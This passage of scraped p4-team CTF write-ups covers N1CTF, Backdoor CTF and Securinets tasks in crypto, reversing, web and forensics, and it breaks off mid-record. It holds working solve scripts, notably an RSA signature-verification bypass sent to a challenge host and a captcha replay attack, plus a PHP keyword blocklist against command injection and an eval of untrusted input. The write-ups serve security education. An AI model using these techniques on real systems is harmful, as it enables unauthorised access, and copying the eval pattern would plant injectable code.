specials_coords = [x[0] for x in specials]\n                intersection_point = find_perpendicular_crossing(specials_coords)\n                print('intersection at', intersection_point)\n                for i in range(3):\n                    send(s, str(intersection_point[i]))\n        except:\n            pass\n\n\nmain()\n```\n\nIn the end the hardest part was parsing the input data and assigning coordinates to numbers.\nThis was because the walls would have random rotations and random positions, so we had to match them by edges.\nAfter that the calculations were pretty simple:\n\n1. Find special points\n2. Calculate vectors between each pair\n3. Find perpendicular vectors (dot product of such vectors is 0)\n4. Find intersection between two lines indicated by 4 points we have (2 points per vector)\n5. If intersection crosses an internal cube then consider this a proper solution\n\nIt took a couple of minutes but we finally got: `N1CTF{This_1s_a_1j_Math_Game4!}`\n", "timestamp": "2025-10-21T13:32:07.278736"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-10-n1ctf/re_patience/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-10-n1ctf/re_patience/README.md", "content": "# Patience (RE, 769p)\n\nThis was a haskell reversing challenge. If this doesn't fill you with dread, this means that probably either:\n\n- you are most 1338 pr0 xakep r3v3rse engineer ever living\n- you don't comprehend the amount of horror that you're going to witness.\n\nEither way, you're in for some serious fun. In fact, I've never seen anyone actually reverse engineer (non-trivial) haskell binary before - most challenges are actually solved with black-box workarounds or other side channels. This task is no different - we are given .cmm file along with compiled binary.\n\nCMM files are dump of late-stage intermediate language from GHC. This is going to make our life way easier - we don't have to reverse haskell thunks, we have everything in plain text... well, sort of.\n\n## How to be lazy\n\nA word of introduction to the beautiful world of functional programming. Haskell is a lazy language. But not just your average slightly-procrastinating kind - everything is delayed as long as it possibly can be, and I mean it. For example, consider this function:\n\n```haskell\nintegers n = n : integers (n+1)\n```\n\nif you don't speak Haskell, this is conceptually equivalent to following python code:\n\n```python\ndef integers(n):\n    return [n] + integers(n + 1)\n```\n\nDo you see anything wrong with this code? Exactly, this is not a terribly useful function - it'll recurse forever, or rather eat all your available stack space and explode. Not in Haskell though - you can call this function, take first 100 elements of the result, and get perfectly useful result - haskell is *lazy*, so only necessary elements will be evaulated.\n\nBut this still doesn't explain just how lazy Haskell is. Consider this:\n\n```haskell\nfoo (2 + 2)\n```\n\nThis is just invoaction of function `foo` with parameter `4`. Wait, wrong, I lied to you. The parameter is `2 + 2`, and it's not actually evaluated until it's needed. Hell, you could've passed `1 / 0` and nothing bad would happen, at least until something actually evaulates the parameter.\n\n## Reversing\n\nSo, why the introduction? Well, this is how `main` function looks like in dump:\n\n```\n==================== Output Cmm ====================\n[section \"\"data\" . :Main.main_closure\" {\n     :Main.main_closure:\n         const :Main.main_info;\n         const 0;\n         const 0;\n         const 0;\n },\n :Main.main_entry() //  [R1]\n         { info_tbl: [(c3bb,\n                       label: :Main.main_info\n                       rep:HeapRep static { Thunk })]\n           stack_info: arg_space: 8 updfr_space: Just 8\n         }\n     {offset\n       c3bb:\n           _01D::P64 = R1;\n           if ((Sp + 8) - 24 < SpLim) goto c3bc; else goto c3bd;\n       c3bc:\n           R1 = _01D::P64;\n           call (stg_gc_enter_1)(R1) args: 8, res: 0, upd: 8;\n       c3bd:\n           (_c3b8::I64) = call \"ccall\" arg hints:  [PtrHint,\n                                                    PtrHint]  result hints:  [PtrHint] newCAF(BaseReg, _01D::P64);\n           if (_c3b8::I64 == 0) goto c3ba; else goto c3b9;\n       c3ba:\n           call (I64[_01D::P64])() args: 8, res: 0, upd: 8;\n       c3b9:\n           I64[Sp - 16] = stg_bh_upd_frame_info;\n           I64[Sp - 8] = _c3b8::I64;\n           R2 = Main.main_closure;\n           R1 = GHC.TopHandler.runMainIO_closure;\n           Sp = Sp - 16;\n           call stg_ap_p_fast(R2, R1) args: 24, res: 0, upd: 24;\n     }\n }]\n```\n\nBeautiful, isn't it? What's going on here? Nothing, actually. All this code does is:\n\n```haskell\nrunMainIO (main_closure)\n```\n\nwhere `main_closure` is well, closure from main. Let's dig deeper - what's inside this `main_closure`?\n\n```haskell\nMain.main_entry() //  [R1]\n        { info_tbl: [(c3aW,\n                      label: Main.main_info\n                      rep:HeapRep static { Thunk })]\n          stack_info: arg_space: 8 updfr_space: Just 8\n        }\n    {offset\n      c3aW:\n          _rFG::P64 = R1;\n          if ((Sp + 8) - 24 < SpLim) goto c3aX; else goto c3aY;\n      c3aX:\n          R1 = _rFG::P64;\n          call (stg_gc_enter_1)(R1) args: 8, res: 0, upd: 8;\n      c3aY:\n          (_c3aT::I64) = call \"ccall\" arg hints:  [PtrHint,\n                                                   PtrHint]  result hints:  [PtrHint] newCAF(BaseReg, _rFG::P64);\n          if (_c3aT::I64 == 0) goto c3aV; else goto c3aU;\n      c3aV:\n          call (I64[_rFG::P64])() args: 8, res: 0, upd: 8;\n      c3aU:\n          I64[Sp - 16] = stg_bh_upd_frame_info;\n          I64[Sp - 8] = _c3aT::I64;\n          R5 = sat_s2Rj_closure+1;\n          R4 = sat_s2Rf_closure;\n          R3 = GHC.Base.$fMonadIO_closure;\n          R2 = Data.Foldable.$fFoldable[]_closure;\n          R1 = Data.Foldable.forM__closure;\n          Sp = Sp - 16;\n          call stg_ap_pppp_fast(R5,\n                                R4,\n                                R3,\n                                R2,\n                                R1) args: 24, res: 0, upd: 24;\n    }                                               \n}                                                   \n```\n\nAgain, a lot of code. And again, This is equivalent to:\n\n```haskell\nforM (s2Rj_closure) (s2Rf_closure)\n```\n\nSo, invocation of single function with two closures.\n\nAnd again...\n\n```haskell\n==================== Cmm produced by new codegen ====================\n[section \"\"data\" . sat_s2Rf_closure\" {\n     sat_s2Rf_closure:\n         const sat_s2Rf_info;\n         const 0;\n         const 0;\n         const 0;\n },\n sat_s2Rf_entry() //  [R1]\n         { info_tbl: [(c3aH,\n                       label: sat_s2Rf_info\n                       rep:HeapRep static { Thunk })]\n           stack_info: arg_space: 8 updfr_space: Just 8\n         }\n     {offset\n       c3aH:\n           _s2Rf::P64 = R1;\n           goto c3aC;\n       c3aC:\n           if ((old + 0) - <highSp> < SpLim) goto c3aI; else goto c3aJ;\n       c3aI:\n           R1 = _s2Rf::P64;\n           call (stg_gc_enter_1)(R1) args: 8, res: 0, upd: 8;\n       c3aJ:\n           (_c3aE::I64) = call \"ccall\" arg hints:  [PtrHint,\n                                                    PtrHint]  result hints:  [PtrHint] newCAF(BaseReg, _s2Rf::P64);\n           if (_c3aE::I64 == 0) goto c3aG; else goto c3aF;\n       c3aG:\n           call (I64[_s2Rf::P64])() args: 8, res: 0, upd: 8;\n       c3aF:\n           I64[(old + 24)] = stg_bh_upd_frame_info;\n           I64[(old + 16)] = _c3aE::I64;\n           R3 = Main.flags_closure+2;\n           R2 = Main.idx'_closure+1;\n           R1 = GHC.Base.map_closure;\n           call stg_ap_pp_fast(R3, R2, R1) args: 24, res: 0, upd: 24;\n     }\n }]\n```\n\nWhich basically means (closure names by me):\n\n```haskell\nmap (idx_closure) (flags_closure)\n```\n\nSo again, single function invocation, with closure parameters, and a lot of junk.\n\nI'll spare you the details - when you know what to expect (i.e. a LOT of thunks), reversing is quite straightforward (except you need a LOT of, well, *patience*).\n\nThis is the reversed code, which should be **very** similar to the original:\n\n```haskell\nmodule Main where\n\nimport Data.Bits\nimport Data.Char\nimport Control.Monad\nimport System.IO\nimport Data.Function.Memoize\n\ns0 = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&'\\\"()*+,-./:;<=>?@[\\\\]^_`{|}~\"\ns1 = \"1vI{e[8Td]-nQ.7O\\\"bl(jq@<0Vy&Z3~\\\\ps,aD^;BN9JUoh|CE2_6!G'rHuf>$S%MxgzKY4`c+WXA5F)mR}#PtL?*=i/:wk\"\ns2 = \"Bp}i{XU%f$DR\\\\0<Lx=o\\\"Sl`bz)-e62|&JqFT!(C5yh;@u*.WaZ#Qv,?cr8wEm4_t19PH:j]>[NVMn7YGkK'^/~OIdsA+3g\"\ns3 = \"_r+#yh[Y)S8aXJwV&jv\\\"o=I(6>pg,f-M]qbN4'EDKF\\\\t<3G%|$csPQm}~0@R;uU2z9iWB./HCk!{:Od^ZT7`Anl1e5L*x?\"\n\ndata Index = Index Int Int\n\nf :: Int -> [Char]\nf 0 = s0\nf arg = s1 ++ f (subtract 1 arg) ++ s2 ++ f (subtract 1 arg) ++ s3\n\nidx :: Index -> Char\nidx (Index i j) = (f i !! j)\n\nflags = [Index 0 39,\n     Index 5 282,\n     Index 6 16240,\n     Index 9 162889,\n     Index 14 523151,\n     Index 17 5536393,\n     Index 7616 133142712,\n     Index 8799 122076774,\n     Index 8656 370998818,\n     Index 9835 12169334,\n     Index 9023 316222630,\n     Index 9402 20517998,\n     Index 9509 206287754,\n     Index 5656 439741488,\n     Index 9020 254692819,\n     Index 5337 505473338,\n     Index 7860 66985734,\n     Index 5342 343561367,\n     Index 7797 237439774,\n     Index 6145 303374550,\n     Index 5842 469397741,\n     Index 6262 125811292,\n     Index 8861 285489743,\n     Index 9917 203482576,\n     Index 6210 65894981,\n     Index 5807 160395306,\n     Index 6950 411117612,\n     Index 9261 130413308,\n     Index 6224 532384558,\n     Index 5304 107223978,\n     Index 6533 292707045,\n     Index 8303 284494291,\n     Index 9948 119890013,\n     Index 8254 430252526,\n     Index 8249 142828351,\n     Index 8799 452127715,\n     Index 6071 491307991,\n     Index 8803 154654024,\n     Index 9328 181393976,\n     Index 6253 103923077,\n     Index 7886 450071326,\n     Index 7721 342235485,\n     Index 6802 429438438,\n     Index 6391 504612462,\n     Index 5300 23633538,\n     Index 9418 315942207,\n     Index 9873 228342978,\n     Index 6361 510000394,\n     Index 5816 485654100,\n     Index 8533 347840847,\n     Index 9931 517634651,\n     Index 8209 122749414,\n     Index 9873 484029647,\n     Index 9346 273221045]\n\nmain = do\n  forM_ (map idx flags) $ \\i -> do\n    putChar i\n    hFlush stdout\n```\n\nNot a lot of code, for huge binary that it produced, eh?\n\nThe problem is simple - `idx` function is very slow. But we can make it faster. I was too *lazy* to rewrite everything to my usual language of choice (python), so I just implemented faster version of `idx` straight in haskell:\n\n```haskell\nfsize' :: Int -> Integer\nfsize' 0 = fromIntegral $ length s0\nfsize' i = 2 * fsize (i - 1) + 3 * fsize 0\n\nfsize :: Int -> Integer\nfsize = memoize fsize'\n\nidx' :: Index -> Char\nidx' (Index i j) =\n    if i == 0 then s0 !! j\n    else if fromIntegral j < fsize0 then s1 !! j\n    else if fromIntegral j < fsize1 then idx' $ Index (i - 1) (j - fromInteger fsize0)\n    else if fromIntegral j < fsize2 then s2 !! (j - fromInteger fsize1)\n    else if fromIntegral j < fsize3 then idx' $ Index (i - 1) (j - fromInteger fsize2)\n    else s3 !! (j - fromInteger fsize3)\n    where fsize0 = fsize 0\n          fsize1 = fsize0 + fsize (i - 1)\n          fsize2 = fsize1 + fsize0\n          fsize3 = fsize2 + fsize (i - 1)\n```\n\nAnd that's basically it - after running reversed version, correct flag is produced in seconds:\n\n```\nN1CTF{did_cmm_helped?1109ef6af4b2c6fc274ddc16ff8365d1}\n```\n\nPS. Yes, it did.\n", "timestamp": "2025-10-21T13:32:07.538242"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-18-backdoor-ctf/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-18-backdoor-ctf/README.md", "content": "# Backdoor CTF 2018\n\nTeam: ak, c7, Eternal, msm, naz, rev, rodbert, shalom\n\n### Table of contents\n\n* [Random Noise (stegano)](random_noise)\n* [Awesome Mix 1 (crypto)](crypto_mix1)\n* [Captcha Revenge (web)](web_captcha)\n* [Array List (pwn)](pwn_array)\n* [Evil Website (forensics)](evil_website)\n", "timestamp": "2025-10-21T13:32:08.082810"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-18-backdoor-ctf/crypto_mix1/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-18-backdoor-ctf/crypto_mix1/README.md", "content": "# Awesome Mix 1 (Crypto)\n\nIn the task we get the source code:\n\n```python\n#!/usr/bin/python -u\n\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import PKCS1_v1_5 as RSAsign\nfrom Crypto.Hash import SHA\nfrom Util import PKCS1_pad as pad\nfrom SECRET import flag\nimport sys\n\ndef verify(s,m,n,e):\n\tif pow(s,e,n) == pad(m):\n\t\treturn True\n\telse:\n\t\treturn False\n\nkey = RSA.generate(1024)\n\nmessage = \"super important information for admin only\"\n\nh = SHA.new(message)\n\nsigner = RSAsign.new(key)\n\nsignature = signer.sign(h)\ns = int(signature.encode(\"hex\"),16)\n\nprint \"Welcome to admin's music portal.\\nTo verify that you are the owner of this service\\nsend the public key which will verify the following signature :\\n\"\n\nprint \"Message   ->\", message\nprint \nprint \"Signature ->\", signature.encode(\"hex\")\nprint \n\nsys.stdout.flush()\n\nn = long(raw_input(\"Enter n:\"))\ne = long(raw_input(\"Enter e:\"))\nsys.stdout.flush()\ninput_key = RSA.construct((n,e))\n\nif verify(s,h.hexdigest(),n,e):\n\tprint flag\nelse:\n\tprint \"Music is only for admin's eyes.\"\n\nsys.stdout.flush()\n```\n\nSo the server generates a random RSA key, signs a certain message with it and asks us for a public key matching the signature.\nThe mistake here is that there are no restrictions on the values for the public key.\n\nWhat we get is: \n\n`signature == message^d mod n`\n\nAnd we want now values `(e,n)` for which holds:\n\n`signature^e mod n == message`\n\nIf we take `e=1` then this equation becomes simply:\n\n`signature mod n == message`\n\nWe can select any `n` we want, so we can choose the trivial case where `signature` is larger from `n` exactly by `message`, so that modulo operation will cut `signature` by `n`.\n\nIf now:\n\n`n = signature-message` \n\nthen \n\n`signature mod (signature-message) = message`\n\nWe used for that code:\n\n```python\nimport re\nfrom Crypto.Hash import SHA\nfrom crypto_commons.netcat.netcat_commons import nc, send, interactive\n\n\ndef PKCS1_pad(data):\n    asn1 = \"003021300906052b0e03021a05000414\"\n    ans = asn1 + data\n    n = len(ans)\n    padding = '0001' + 'f' * (1024 / 4 - n - 4)\n    return int((padding + ans), 16)\n\n\ndef main():\n    port = 8082\n    host = \"51.15.73.163\"\n    s = nc(host, port)\n    data = s.recv(99999)\n    print(data)\n    sig = re.findall(\"Signature ->(.*)\", data)[0]\n    signature = int(sig.strip(), 16)\n    message = \"super important information for admin only\"\n\t\n    h = SHA.new(message)\n    m = PKCS1_pad(h.hexdigest())\n    e = 1\n    n = signature ** e - m\n    print('n', n)\n    print('e', e)\n    send(s, str(n))\n    send(s, str(e))\n    interactive(s)\n\n\nmain()\n```\n\nAnd got `CTF{cryp70_5ur3_15_w13rd}`\n", "timestamp": "2025-10-21T13:32:08.376565"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-18-backdoor-ctf/evil_website/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-18-backdoor-ctf/evil_website/README.md", "content": "# Evil Website (forensics)\n\nWe're given a directory containing lots of interesting firefox stuff.\n\n```\n┌[michal@Bobik] [/dev/ttys002] [master ⚡] \n└[~/Downloads/Chall]> ls\nAlternateServices.txt              containers.json                    firebug                            modifyheaders.conf                 serviceworker.txt\nSecurityPreloadState.txt           content-prefs.sqlite               formhistory.sqlite                 notificationstore.json             sessionCheckpoints.json\nSiteSecurityServiceState.txt       cookies.sqlite                     gmp                                permissions.sqlite                 sessionstore-backups\naddonStartup.json.lz4              cookies.sqlite-shm                 gmp-gmpopenh264                    pkcs11.txt                         shield-preference-experiments.json\naddons.json                        cookies.sqlite-wal                 gmp-widevinecdm                    places.sqlite                      storage\nblocklist.xml                      crashes                            handlers.json                      places.sqlite-shm                  storage.sqlite\nblocklists                         datareporting                      key3.db                            places.sqlite-wal                  times.json\nbookmarkbackups                    extensions                         key4.db                            pluginreg.dat                      weave\nbrowser-extension-data             extensions.json                    kinto.sqlite                       prefs.js                           webapps\ncert8.db                           favicons.sqlite                    lock                               revocations.txt                    webappsstore.sqlite\ncert9.db                           favicons.sqlite-shm                logins.json                        saved-telemetry-pings              webappsstore.sqlite-shm\ncert_override.txt                  favicons.sqlite-wal                mimeTypes.rdf                      search.json.mozlz4                 webappsstore.sqlite-wal\ncompatibility.ini                  features                           minidumps                          secmod.db                          xulstore.json\n```\n\nUnfortunately, all we had to do is notice a pretty suspicious cookie:\n\n![cookie](cookie.png)\n\nDecoding the base64 gave us a weird `Targa image data` file.\nYou might be tempted to look for some weird ancient software just to view it, but as it turned out that the best way was to actually just import it into gimp as raw data:\n\n![solution](solution.png)\n\n", "timestamp": "2025-10-21T13:32:08.618698"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-18-backdoor-ctf/web_captcha/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-18-backdoor-ctf/web_captcha/README.md", "content": "# Captcha Revenge (Web)\n\nIn the task we get a website which displays some brainfuck code and an audio captcha challenge.\nIf we have 0 captchas solved, it actually tells us the solution for the first one.\nThe goal is to get a certain number of correct, consecutive solutions.\nBrainfuck part is rather trivial, we have challenge like:\n\n```\nCan y0u print something out of this brain-fucking c0de?\n++++++++++[ > ++++++ < -]>.[-]++++++++++[ > ++++++ < -]>+++.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > ++++++++++ < -]>++++.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > + < -]>.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++++++.[-]++++++++++[ > ++++++++++ < -]>+.[-]++++++++++[ > ++++++++++++ < -]>.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > ++++++ < -]>+.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > ++++ < -]>++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>++++++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > ++++ < -]>++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > + < -]>.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > ++++++++++ < -]>+.[-]++++++++++[ > +++++++++ < -]>+++++++++.[-]++++++++++[ > ++++++++++ < -]>++++.[-]++++++++++[ > +++++++++++ < -]>+.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > ++++ < -]>.[-]++++++++++[ > ++++++++++ < -]>+.[-]++++++++++[ > ++++++++++++ < -]>.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > ++++ < -]>+.[-]++++++++++[ > +++++ < -]>+++++++++.[-]++++++++++[ > + < -]>.[-]++++++++++[ > ++++++ < -]>+++.[-]++++++++++[ > ++++++ < -]>++.[-]\n```\n\nWhich translates to:\n\n```php\n<?php\n    $exp = 35074*93723+83241+77719*70047+15999\n    echo (exp);\n?>\n```\n\nThere can be examples in other languages, but in all cases we have `exp = some_equation`, so we can simply eval this in python.\nWe grabbed some random python lib to evaluate brainfuck, and then just did:\n\n```python\ndef evaluate_brainfuck(code):\n    some_code = brainfuck.evaluate(code)\n    bf = re.findall(r\"exp = (.*)\\n\", some_code)[0]\n    return str(eval(bf)) # let's hope they won't send anything nasty...\n```\n\nThe hard part seems to be the captcha itself. We've done a fair share of those in the past, but this one was actually hard.\nStuff like Google Speech API would fail, and we couldn't simply cut this in parts and match individual numbers, because they were slight differences between captchas (pitch, speed etc).\n\nHowever, we noticed that this is a `web` task and not a `ppc`!\nSo maybe we don't really have to solve any captchas at all?\n\nSome dirbusting got us a hit on `.git`, which meant we could download the [source code of the challenge](source.php).\n\nThere was an interesting function:\n\n```php\nfunction is_clean($input){\n\tif (preg_match(\"/SESSION/i\", $input)){//no seesion variable alteration\n\t\tbad_hacking_penalty();\n\t\treturn false;\n\t}\n\tif (preg_match('/(base64_|eval|system|shell_|exec|php_)/i', $input)){//no coomand injection \n\t\tbad_hacking_penalty();\n\t\treturn false;\n\t}\n\tif (preg_match('/(file|echo|die|print)/i', $input)){//no file access\n\t\tbad_hacking_penalty();\n\t\treturn false;\n\t}\n\tif (preg_match(\"/(or|\\|)/\", $input)){//Be brave use AND\n\t\tbad_hacking_penalty();\n\t\treturn false;\n\t}\n\tif (preg_match('/(flag)/i', $input)){//don't take shortcuts\n\t\tbad_hacking_penalty();\n\t\treturn false;\n\t}\n\t//clean input\n\treturn true;\n}\n```\n\nWhich was used to filter our answer because it would go into `assert(\"'$real_ans' === '$user_ans'\")` and `assert` works like `eval`, so otherwise we could actually execute code there.\nIt's quite obvious that intended solution was to bypass those checks and gain RCE, but we're too lazy for that.\n\nWe noticed in the code that captchas come from:\n\n```php\nfunction random_string(){\n\t$captcha_file = \"xxxxxxxx\";\n\t$random_index = rand(0, 999);\n\t$i = 1;\n\tforeach(file($captcha_file) as $line) {\n   \t\tif ($i == $random_index) return $line;\n   \t\t$i++;\n\t}\n}\n```\n\nWhich means there are only 1000 unique options to choose from.\nWhy not just download a lot of them and actually solve the game?\nIt's doable since they tell us the solution for a captcha if we have 0 solved.\nWe can simply do a GET to the page, download captcha, read the solution, and save the file for future:\n\n```python\ndef download_captchas():\n    url = \"http://51.15.73.163:13335/\"\n    we_have = {}\n    for file in os.listdir(\"download\"):\n        with codecs.open(\"download/\" + file, \"rb\") as input_file:\n            we_have[input_file.read()] = file\n    while len(we_have) < 1000:\n        r = requests.get(url)\n        id = re.findall(\"source src=gen_cap/(.*) type=\", r.text)[0]\n        answer = re.findall(\"e.g Type '(.+?)'\", r.text)[0]\n        b = requests.get(url + \"gen_cap/\" + id).content\n        if b not in we_have:\n            print(\"new one!\", len(we_have))\n            we_have[b] = answer\n            with codecs.open(\"download/\" + answer, \"wb\") as output_file:\n                output_file.write(b)\n```\n\nThis code simply downloads and stores unique captchas.\n\nIn the meantime we can try to win the game with the captchas we already have.\nWe just go on the page, download captcha and check if we got this one.\nIf we do, then we send the answer.\nOtherwise we start all over again:\n\n```python\ndef solve():\n    while True:\n        try:\n            captchas = {}\n            for file in os.listdir(\"download\"):\n                with codecs.open(\"download/\" + file, \"rb\") as input_file:\n                    captchas[input_file.read()] = file\n            url = \"http://51.15.73.163:13335/\"\n            r = s.get(url)\n            for i in range(501):\n                brainfuck = re.findall(\"c0de\\?<br>\\n(.*?)</div>\", r.text, re.DOTALL)[0]\n                brainfuck = brainfuck.replace(\"&gt;\", \">\").replace(\"&lt;\", \"<\")\n                id = re.findall(\"source src=gen_cap/(.*) type=\", r.text)[0]\n                b = requests.get(url + \"gen_cap/\" + id).content\n                brainfuck_answer = evaluate_brainfuck(brainfuck)\n                captcha_solution = captchas[b]\n                r = s.post(url, data={\"captcha\": captcha_solution, \"answer\": brainfuck_answer}, cookies={\"PHPSEESSID\": \"p4rulezz\"})\n                print(r.text)\n            break\n        except KeyError:\n            print(\"missing captcha :(\")\n            pass\n```\n\nThis code will loop until we actually get the flag.\nIt took a while to download enough examples to win, but in the end we got: `CTF{too_many_captchas_but_PHP_made_it_a_cakewalk}`\nBut in our case PHP didn't really help at all.\n", "timestamp": "2025-10-21T13:32:09.004776"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-24-securinets/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-24-securinets/README.md", "content": "# Securinets CTF Quals 2018\n\nTeam: shalom, akrasuski1, psrok1, nazywam, sasza\n\n### Table of contents\n\n* [The worst RSA joke (crypto)](crypto_worst_rsa)\n* [Looser (crypto)](crypto_looser)\n* [Improve the quality (crypto)](crypto_quality)\n* [Notice me (forensics)](for_notice)\n* [Magic test (web)](web_magic)\n* [Special (pwn)](pwn_special)\n* [Tic Tac Toe (web/misc)](web_tictactoe)\n* [No mercy (pwn)](pwn_no_mercy)\n* [Lone author (forenics)](for_lone)\n", "timestamp": "2025-10-21T13:32:09.557369"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-24-securinets/crypto_looser/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-24-securinets/crypto_looser/README.md", "content": "# Looser (Crypto)\n\nWe get [encrypted flag](flag.png.crypt) to work with.\nJudging by extension we can deduce that the orignal file was a PNG.\nWe don't have much to work with, so we assume the simplest approach - some kind of stream cipher / XOR encryption.\nWe know header of PNG file, so we can XOR the existing header with what we expect, and therefore extract the potential XOR key.\n\nWe assume that this is going to be some kind of repeating-xor encryption, so once we get the key, we can multiply it and decrypt the whole file:\n\n```python\nfrom crypto_commons.generic import xor, xor_string\n\n\ndef main():\n    with open('flag.png.crypt', 'rb') as f:\n        data = f.read()\n        png_header = [137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 0xd, 0x49, 0x48, 0x44, 0x52, 0x0, 0x0]\n        result = xor(png_header, map(ord, data[:len(png_header)]))\n        key = \"\".join([chr(c) for c in result]) + (\"\\0\" * (18 - len(png_header)))\n        print(key.encode(\"hex\"))\n        with open('result.png', 'wb') as f:\n            f.write(xor_string(data, key * (len(data) / len(key))))\n\n\nmain()\n```\n\nAs it turns out, it was even simpler - the whole file was encrypted with a single byte XOR key `e`.\nWe recover the original picture:\n\n![](result.png)\n", "timestamp": "2025-10-21T13:32:09.797048"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-24-securinets/crypto_quality/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-24-securinets/crypto_quality/README.md", "content": "# Improve the quality (Crypto)\n\nIn the task we get a [lengthly description](description.txt).\nShort version is:\n\n1. We have ECC encryption.\n2. The curve is `y^2 = x^3 + 658974*x + B` with most significat decimal digit of `B` being `6`\n3. Prime field is based on `p = 962280654317`\n4. We get generator point `P = (518459267012, 339109212996)`\n5. We get a set of points `Qi` where `Qi = ki * P`\n6. The final secret value is a combination of `ki` values (this was very unclear, but in the end it was just concatenation of `ki` values treated as decimal strings and this converted to bytes).\n\nWe start-off by recovering the missing `B` parameter of the curve.\nThis is trivial, since we've got points on the curve and we can just solve the equation `y^2 = x^3 + 658974*x + B`.\nWe transform this to:\n\n`B = (y^2 - x^3 - 658974*x) mod p`\n\nAnd apply this to `P = (518459267012, 339109212996)` which gives us `618`, and it fits the hint from the description that `6` is the most significant digit of `B`.\n\n```python\nprime = 962280654317\nx = 518459267012\ny = 339109212996\nA = 658974\nB = (y^2 - x^3 - A*x) %prime\n```\n\nNow we need to recover the `ki` values.\nThe prime field is very small, so we can efficiently calculate so-called `discrete logarithm` over the elliptic curve.\nFortunately `sage` has all of this already implemented so we just need to do:\n\n```python\nK.<z> = GF(prime)\nE = EllipticCurve(K,[A,B])\nP = E([x,y]) # generator point\n\nsolutions = []\nfor px,py in data:\n    Q = E([px,py])\n    solution = P.discrete_log(Q)\n    print(px,py, solution)\n    solutions.append(solution)\nprint(solutions)\n```\n\nAnd from this we recover the `ki` values.\nWe combine them to get the secret `K`:\n\n```python\nlarge_string = \"\".join([str(ki) for ki in solutions])\nprint(\"\".join(map(lambda x: chr(int(x)), chunk(large_string, 2))))\n```\n\nThis gives:\n\n```\nCONVERT THIS TO LOWER CASE FIRST :\nTHIS IMAGE CONTAINS THE FLAG, TRY TO GET IT\nTHE SUBMITTED FLAG MUST BE IN THIS FORMAT: \nFLAG-EC[WHAT YOU'LL FIND IN THE IMAGE]\nIMAGE URL:\nHTTP://CRYPTO.CTFSECURINETS.COM/1/STEG-PART.PNG\n```\n\nFortunately there is not much of a stegano there really.\nThe picture is:\n\n![](steg-part.png)\n\nAnd can be easily read to get the final flag: `flag-ec[EC_St!e-g1(a)no]`\n", "timestamp": "2025-10-21T13:32:10.046062"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-24-securinets/crypto_quality/description.txt", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-24-securinets/crypto_quality/description.txt", "content": "Hello Every one,\nWe didn't know what to do, so we are asking for your help.\n\nA friend of us sent us the following text:\n\nI used an elliptic curve encrytion for the first time.\nThe only thing that i kown about elliptic curve is that a number K must always be hidden.\nso i made multiple encryption to send some information.\n\nHere is all the informations about the elliptic curve that i used excep the K number.\n\nThe elliptic curve is : \ny^2 = x^3 + A*x + B\nA = 658974\nSorry i forget the B :/ , I just remember that it's most significant number is  6\n\nAs an order of a finite field must be a prime power, i used p = 962280654317 (FiniteField(p)).\nas a starter point, i used the generator G for this elliptic curve: (518459267012 : 339109212996 : 1)\nand each time i reuse it to encrypt again\n\nlet my secret message be K .\nfor exemple I divided my K to 2 elements k1 and k2\nthen Q1 is k1*G\nand Q2 is 